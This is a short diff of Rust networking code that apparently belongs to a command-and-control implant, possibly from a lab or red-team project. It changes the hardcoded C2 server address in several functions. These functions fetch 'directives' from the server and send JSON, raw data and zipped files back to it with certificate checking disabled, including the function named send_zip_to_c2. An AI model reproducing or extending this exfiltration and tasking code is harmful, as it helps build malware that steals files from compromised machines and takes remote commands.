@@ -40,7 +40,7 @@ pub async fn send_directive_status(
     });
 
     let res = client
-        .post("https://172.28.161.20:3030/sync")
+        .post("https://192.168.19.186:3030/sync")
         .json(&body)
         .send()
         .await;
@@ -53,7 +53,7 @@ pub async fn send_directive_status(
 }
 
 pub async fn get_directives() -> Result<Vec<String>, Error> {
-    let url = "https://172.28.161.20:3030/directives";
+    let url = "https://192.168.19.186:3030/directives";
 
     let client = reqwest::Client::builder()
         .danger_accept_invalid_certs(true)
@@ -77,7 +77,7 @@ pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
         .build()?;
 
     let _res = client
-        .post("https://172.28.161.20:3030/directives")
+        .post("https://192.168.19.186:3030/directives")
         .header("Content-Type", "application/json")
         .json(data)
         .send()
@@ -92,7 +92,7 @@ pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
         .build()?;
 
     let _res = client
-        .post("https://172.28.161.20:3030/directives")
+        .post("https://192.168.19.186:3030/directives")
         .body(data)
         .send()
         .await?;
@@ -164,7 +164,7 @@ pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::E
     let file_bytes = tokio::fs::read(filepath).await?;
 
     let response = client
-        .post("https://172.28.161.20:3030/directives")
+        .post("https://192.168.19.186:3030/directives")
         .header("Content-Type", "application/zip")
         .body(file_bytes)
         .send()
